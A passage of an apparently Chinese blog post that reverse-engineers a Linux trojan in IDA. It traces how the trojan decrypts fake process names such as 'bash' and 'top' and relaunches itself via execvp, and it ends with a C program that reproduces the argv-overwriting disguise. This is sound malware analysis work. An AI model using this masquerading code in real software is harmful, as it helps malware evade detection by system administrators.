class="line">.data:080CBB54 a12             db &#x27;1*2&#x27;,0              ; sh</span><br><span class="line">.data:080CBB58                 db    0</span><br><span class="line">.data:080CBB59                 db    0</span><br><span class="line">.data:080CBB5A                 db    0</span><br><span class="line">.data:080CBB5B                 db    0</span><br><span class="line">.data:080CBB5C                 db    0</span><br><span class="line">.data:080CBB5D                 db    0</span><br><span class="line">.data:080CBB5E                 db    0</span><br><span class="line">.data:080CBB5F                 db    0</span><br><span class="line">.data:080CBB60                 db    0</span><br><span class="line">.data:080CBB61                 db    0</span><br><span class="line">.data:080CBB62                 db    0</span><br><span class="line">.data:080CBB63                 db    0</span><br><span class="line">.data:080CBB64                 db    0</span><br><span class="line">.data:080CBB65                 db    0</span><br><span class="line">.data:080CBB66                 db    0</span><br><span class="line">.data:080CBB67                 db    0</span><br><span class="line">.data:080CBB68                 db  20h                 ; bash</span><br><span class="line">.data:080CBB69                 db  23h ; #</span><br><span class="line">.data:080CBB6A                 db  41h ; A</span><br><span class="line">.data:080CBB6B                 db  2Eh ; .</span><br><span class="line">.data:080CBB6C                 db  41h ; A</span><br><span class="line">.data:080CBB6D                 db    0</span><br><span class="line">.data:080CBB6E                 db    0</span><br><span class="line">.data:080CBB6F                 db    0</span><br><span class="line">.data:080CBB70                 db    0</span><br><span class="line">.data:080CBB71                 db    0</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.data:080CBBB8                 db  2Eh ; .             ; ls -la</span><br><span class="line">.data:080CBBB9                 db  31h ; 1</span><br><span class="line">.data:080CBBBA                 db  12h</span><br><span class="line">.data:080CBBBB                 db  6Bh ; k</span><br><span class="line">.data:080CBBBC                 db  2Dh ; -</span><br><span class="line">.data:080CBBBD                 db  52h ; R</span><br><span class="line">.data:080CBBBE                 db  36h ; 6</span><br><span class="line">.data:080CBBBF                 db    0</span><br><span class="line">.data:080CBBC0                 db    0</span><br><span class="line">.data:080CBBC1                 db    0</span><br><span class="line">.data:080CBBC2                 db    0</span><br><span class="line">.data:080CBBC3                 db    0</span><br><span class="line">.data:080CBBC4                 db    0</span><br><span class="line">.data:080CBBC5                 db    0</span><br><span class="line">.data:080CBBC6                 db    0</span><br><span class="line">.data:080CBBC7                 db    0</span><br><span class="line">.data:080CBBC8                 db    0</span><br><span class="line">.data:080CBBC9                 db    0</span><br><span class="line">.data:080CBBCA                 db    0</span><br><span class="line">.data:080CBBCB                 db    0</span><br><span class="line">.data:080CBBCC                 db  36h ; 6             ; top</span><br><span class="line">.data:080CBBCD                 db  2Dh ; -</span><br><span class="line">.data:080CBBCE                 db  42h ; B</span><br><span class="line">.data:080CBBCF                 db  46h ; F</span><br><span class="line">.data:080CBBD0                 db    0</span><br><span class="line">.data:080CBBD1                 db    0</span><br><span class="line">.data:080CBBD2                 db    0</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>呵呵，已经看到 top， ls -al 等信息了，查看daemonname 的交叉引用，发现在main函数<br>中，到main里看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804AC30 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0804AC30                 public main</span><br><span class="line">.text:0804AC30 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">.text:0804AF4E                 mov     ebx, offset daemonname ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.text:0804AFC2 loc_804AFC2:                            ; CODE XREF: main+3ABj</span><br><span class="line">.text:0804AFC2                 mov     [esp], ebx</span><br><span class="line">.text:0804AFC5                 add     ebx, 14h</span><br><span class="line">.text:0804AFC8                 mov     dword ptr [esp+4], 14h</span><br><span class="line">.text:0804AFD0                 call    encrypt_code</span><br><span class="line">.text:0804AFD5                 cmp     ebx, offset unk_80CBD0C</span><br><span class="line">.text:0804AFDB                 jnz     short loc_804AFC2</span><br></pre></td></tr></table></figure><p>这段汇编代码，使用了一个循环，调用encrypt_code 对daemonname进行了解密。<br>后面的代码，用到了daemonname的地方有下面几处，</p><p>第一处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B29F                 call    getpid</span><br><span class="line">.text:0804B2A4                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804B2AC                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804B2B4                 mov     [esp], esi             ；第三形参 pid</span><br><span class="line">.text:0804B2B7                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804B2BB                 call    snprintf</span><br><span class="line">.text:0804B2C0                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804B2C8                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804B2CF                 call    randomid</span><br><span class="line">.text:0804B2D4                 mov     [esp+8], esi</span><br><span class="line">.text:0804B2D8                 mov     [esp], edi             ；第一形参 要跑的木马</span><br><span class="line">.text:0804B2DB                 movzx   eax, ax</span><br><span class="line">.text:0804B2DE                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804B2E1                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804B2E8                 mov     [esp+4], eax           ; 第二形参  daemonname</span><br><span class="line">.text:0804B2EC                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure><p>第二处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B932                 lea     edx, [ebp+var_1888]</span><br><span class="line">.text:0804B938                 add     ebx, 1</span><br><span class="line">.text:0804B93B                 mov     [esp], edx</span><br><span class="line">.text:0804B93E                 call    randmd5</span><br><span class="line">.text:0804B943                 mov     [ebp+var_22], 0</span><br><span class="line">.text:0804B94A                 mov     [ebp+var_1E], 0</span><br><span class="line">.text:0804B951                 mov     [ebp+var_1A], 0</span><br><span class="line">.text:0804B957                 call    getpid</span><br><span class="line">.text:0804B95C                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804B964                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804B96C                 mov     [esp], esi</span><br><span class="line">.text:0804B96F                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804B973                 call    snprintf</span><br><span class="line">.text:0804B978                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804B980                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804B987                 call    randomid</span><br><span class="line">.text:0804B98C                 mov     [esp+8], esi</span><br><span class="line">.text:0804B990                 movzx   eax, ax</span><br><span class="line">.text:0804B993                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804B996                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804B99D                 mov     [esp+4], eax</span><br><span class="line">.text:0804B9A1                 lea     eax, [ebp+var_1888]</span><br><span class="line">.text:0804B9A7                 mov     [esp], eax</span><br><span class="line">.text:0804B9AA                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure><p>第三处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B9DF                 lea     edx, [ebp+var_1C88]</span><br><span class="line">.text:0804B9E5                 add     ebx, 1</span><br><span class="line">.text:0804B9E8                 mov     [esp], edx</span><br><span class="line">.text:0804B9EB                 call    randmd5</span><br><span class="line">.text:0804B9F0                 mov     [ebp+var_22], 0</span><br><span class="line">.text:0804B9F7                 mov     [ebp+var_1E], 0</span><br><span class="line">.text:0804B9FE                 mov     [ebp+var_1A], 0</span><br><span class="line">.text:0804BA04                 call    getpid</span><br><span class="line">.text:0804BA09                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804BA11                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804BA19                 mov     [esp], esi</span><br><span class="line">.text:0804BA1C                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804BA20                 call    snprintf</span><br><span class="line">.text:0804BA25                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804BA2D                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804BA34                 call    randomid</span><br><span class="line">.text:0804BA39                 mov     [esp+8], esi</span><br><span class="line">.text:0804BA3D                 movzx   eax, ax</span><br><span class="line">.text:0804BA40                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804BA43                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804BA4A                 mov     [esp+4], eax</span><br><span class="line">.text:0804BA4E                 lea     eax, [ebp+var_1C88]</span><br><span class="line">.text:0804BA54                 mov     [esp], eax</span><br><span class="line">.text:0804BA57                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure><p>都是作为LinuxExec_Argv2 参数使用的，接着来看LinuxExec_Argv2 的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:08048520 LinuxExec_Argv2 proc near               ; CODE XREF: DelService+B3p</span><br><span class="line">.text:08048520                                         ; DelService+CBlp ...</span><br><span class="line">.text:08048520</span><br><span class="line">.text:08048520 argv            = dword ptr -18h</span><br><span class="line">.text:08048520 var_14          = dword ptr -14h</span><br><span class="line">.text:08048520 var_10          = dword ptr -10h</span><br><span class="line">.text:08048520 var_C           = dword ptr -0Ch</span><br><span class="line">.text:08048520 var_8           = dword ptr -8</span><br><span class="line">.text:08048520 var_4           = dword ptr -4</span><br><span class="line">.text:08048520 file            = dword ptr  8</span><br><span class="line">.text:08048520 arg_4           = dword ptr  0Ch</span><br><span class="line">.text:08048520 arg_8           = dword ptr  10h</span><br><span class="line">.text:08048520</span><br><span class="line">.text:08048520                 push    ebp</span><br><span class="line">.text:08048521                 mov     ebp, esp</span><br><span class="line">.text:08048523                 sub     esp, 28h</span><br><span class="line">.text:08048526                 mov     [ebp+var_4], esi</span><br><span class="line">.text:08048529                 mov     esi, [ebp+file]</span><br><span class="line">.text:0804852C                 mov     [ebp+var_8], ebx</span><br><span class="line">.text:0804852F                 mov     [ebp+argv], 0</span><br><span class="line">.text:08048536                 mov     [ebp+var_14], 0</span><br><span class="line">.text:0804853D                 mov     [ebp+var_10], 0</span><br><span class="line">.text:08048544                 mov     [ebp+var_C], 0</span><br><span class="line">.text:0804854B                 call    doublefork</span><br><span class="line">.text:08048550                 test    eax, eax</span><br><span class="line">.text:08048552                 jz      short ZERO</span><br><span class="line">.text:08048554                 mov     ebx, [ebp+var_8]</span><br><span class="line">.text:08048557                 mov     esi, [ebp+var_4]</span><br><span class="line">.text:0804855A                 mov     esp, ebp</span><br><span class="line">.text:0804855C                 pop     ebp</span><br><span class="line">.text:0804855D                 retn</span><br><span class="line">.text:0804855E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0804855E</span><br><span class="line">.text:0804855E ZERO:                                   ; CODE XREF: LinuxExec_Argv2+32j</span><br><span class="line">.text:0804855E                 mov     ebx, 3</span><br><span class="line">.text:08048563</span><br><span class="line">.text:08048563 LOOP:                                   ; CODE XREF: LinuxExec_Argv2+54j</span><br><span class="line">.text:08048563                 mov     [esp], ebx      ; fd</span><br><span class="line">.text:08048566                 add     ebx, 1</span><br><span class="line">.text:08048569                 call    close</span><br><span class="line">.text:0804856E                 cmp     ebx, 400h       ；400h == 1024</span><br><span class="line">.text:08048574                 jnz     short LOOP</span><br><span class="line">.text:08048576                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line">.text:0804857C                 mov     [esp], esi      ; file</span><br><span class="line">.text:0804857F                 mov     [ebp+var_14], eax</span><br><span class="line">.text:08048582                 mov     eax, [ebp+arg_8]；eax = pid</span><br><span class="line">.text:08048585                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048588                 lea     eax, [ebp+argv]</span><br><span class="line">.text:0804858B                 mov     [esp+4], eax    ; argv</span><br><span class="line">.text:0804858F                 call    execvp</span><br><span class="line">.text:08048594                 mov     dword ptr [esp], 0 ; status</span><br><span class="line">.text:0804859B                 call    exit</span><br><span class="line">.text:0804859B LinuxExec_Argv2 endp</span><br></pre></td></tr></table></figure><p>LinuxExec_Argv2 有三个参数。最终执行了execvp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0804857C                 mov     [esp], esi      ; file </span><br><span class="line">...</span><br><span class="line">.text:0804858B                 mov     [esp+4], eax    ; argv</span><br><span class="line">.text:0804858F                 call    execvp</span><br></pre></td></tr></table></figure><p>伪代码为，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(file, &amp;argv);</span><br></pre></td></tr></table></figure><p>file 就是arg_0, 需要分析argv， 调出栈图就比较清晰了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            dd ?                    ; offset</span><br><span class="line">-00000014 var_14          dd ?</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先是这句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:08048529                 mov     esi, [ebp+file]</span><br><span class="line">...</span><br><span class="line">.text:0804852F                 mov     [ebp+argv], 0</span><br><span class="line">...</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                       ; offset</span><br><span class="line">-00000014 var_14          dd ?</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br></pre></td></tr></table></figure><p>再看这几句代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048576                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:08048579                 mov     [ebp+argv], esi</span><br><span class="line">...</span><br><span class="line">.text:0804857F                 mov     [ebp+var_14], eax</span><br></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                   ; offset</span><br><span class="line">-00000014 var_14          arg_4</span><br><span class="line">-00000010 var_10          dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br></pre></td></tr></table></figure><p>接下来是这几句代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048582                 mov     eax, [ebp+arg_8]；eax = pid</span><br><span class="line">.text:08048585                 mov     [ebp+var_10], eax</span><br></pre></td></tr></table></figure><p>执行了这几句代码后，栈图发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-00000018 argv            arg_0                   ; offset</span><br><span class="line">-00000014 var_14          arg_4</span><br><span class="line">-00000010 var_10          arg_8</span><br><span class="line">-0000000C var_C           0</span><br><span class="line">-00000008 var_8           dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 file            dd ?                    ; offset</span><br><span class="line">+0000000C arg_4           dd ?</span><br><span class="line">+00000010 arg_8           dd ?</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>main函数中对LinuxExec_Argv2 的调用的为代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinuxExec_Argv2(&#x27;木马路径&#x27;, &#x27;伪装命令行&#x27;, pid);</span><br></pre></td></tr></table></figure><p>因此最后调用的execvp的伪代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(&#x27;木马路径&#x27;, argv);</span><br></pre></td></tr></table></figure><p>将进入 main 函数参数个数为3的流程，用IDA重命名后，关键代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">text:0804B5D3 PARAM_NUM_3:                            ; CODE XREF: main+3CDj</span><br><span class="line"></span><br><span class="line">.text:0804B5D3                 lea     eax, [ebp+var_18]</span><br><span class="line">.text:0804B5D6                 mov     [esp+4], eax</span><br><span class="line">.text:0804B5DA                 lea     eax, [ebp+self_path]</span><br><span class="line">.text:0804B5E0                 mov     [esp], eax</span><br><span class="line">.text:0804B5E3                 call    readfile</span><br><span class="line">.text:0804B5E8                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B5EE                 mov     ebx, [edx+4]</span><br><span class="line">.text:0804B5F1                 mov     [ebp+self_file_content], eax</span><br><span class="line">.text:0804B5F7                 mov     [esp], ebx</span><br><span class="line">.text:0804B5FA                 call    strlen</span><br><span class="line">.text:0804B5FF                 mov     [esp+4], ebx</span><br><span class="line">.text:0804B603                 mov     [esp+8], eax</span><br><span class="line">.text:0804B607                 lea     eax, [ebp+fake_cmd]</span><br><span class="line">.text:0804B60D                 mov     [esp], eax</span><br><span class="line">.text:0804B610                 call    memmove</span><br><span class="line">.text:0804B615                 mov     dword ptr [esp+0Ch], 0</span><br><span class="line">.text:0804B61D                 mov     dword ptr [esp+8], 0Ah</span><br><span class="line">.text:0804B625                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B62D                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B633                 mov     eax, [edx+8]</span><br><span class="line">.text:0804B636                 mov     [esp], eax</span><br><span class="line">.text:0804B639                 call    __strtol_internal</span><br><span class="line">.text:0804B63E                 mov     esi, eax</span><br><span class="line">.text:0804B640                 mov     eax, [ebp+argv_arr]</span><br><span class="line">.text:0804B646                 mov     ebx, [eax]</span><br><span class="line">.text:0804B648                 mov     [esp], ebx</span><br><span class="line">.text:0804B64B                 call    strlen</span><br><span class="line">.text:0804B650                 mov     [esp], ebx</span><br><span class="line">.text:0804B653                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B65B                 mov     [esp+8], eax</span><br><span class="line">.text:0804B65F                 call    memset</span><br><span class="line">.text:0804B664                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B66A                 mov     ebx, [edx+4]</span><br><span class="line">.text:0804B66D                 mov     [esp], ebx</span><br><span class="line">.text:0804B670                 call    strlen</span><br><span class="line">.text:0804B675                 mov     [esp], ebx</span><br><span class="line">.text:0804B678                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B680                 mov     [esp+8], eax</span><br><span class="line">.text:0804B684                 call    memset</span><br><span class="line">.text:0804B689                 mov     eax, [ebp+argv_arr]</span><br><span class="line">.text:0804B68F                 mov     ebx, [eax+8]</span><br><span class="line">.text:0804B692                 mov     [esp], ebx</span><br><span class="line">.text:0804B695                 call    strlen</span><br><span class="line">.text:0804B69A                 mov     [esp], ebx</span><br><span class="line">.text:0804B69D                 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0804B6A5                 mov     [esp+8], eax</span><br><span class="line">.text:0804B6A9                 call    memset</span><br><span class="line">.text:0804B6AE                 lea     edx, [ebp+fake_cmd]</span><br><span class="line">.text:0804B6B4                 mov     [esp+4], edx</span><br><span class="line">.text:0804B6B8                 mov     edx, [ebp+argv_arr]</span><br><span class="line">.text:0804B6BE                 mov     eax, [edx]</span><br><span class="line">.text:0804B6C0                 mov     [esp], eax</span><br><span class="line">.text:0804B6C3                 call    strcpy</span><br><span class="line">.text:0804B6C8                 lea     eax, [ebp+filename]</span><br><span class="line">.text:0804B6CE                 mov     [esp+0Ch], esi</span><br><span class="line">.text:0804B6D2                 lea     esi, [ebp+randstr_10]</span><br></pre></td></tr></table></figure><p>上面代码的原理大致等同于下面这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> fake_cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_cmd, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="type">char</span> * argv_arr_1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> argv_arr_1_length = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);</span><br><span class="line">    <span class="type">long</span> pid_long = strtol(argv[<span class="number">2</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="type">char</span> * v29 = (<span class="type">char</span> *)*argv;</span><br><span class="line">    <span class="type">int</span> v30 = <span class="built_in">strlen</span>(*argv);</span><br><span class="line">    <span class="built_in">memset</span>(v29, <span class="number">0</span>, v30);</span><br><span class="line">    <span class="type">char</span> * v31 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> v32 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, v32);</span><br><span class="line">    <span class="type">char</span> * v33 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> v34 = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v33, <span class="number">0</span>, v34);</span><br><span class="line">    <span class="built_in">strcpy</span>(*argv, fake_cmd);</span><br><span class="line">    sleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译后执行可以看到效果和运行样本的一样。</p><figure class="highlight bash"><table><tr><td 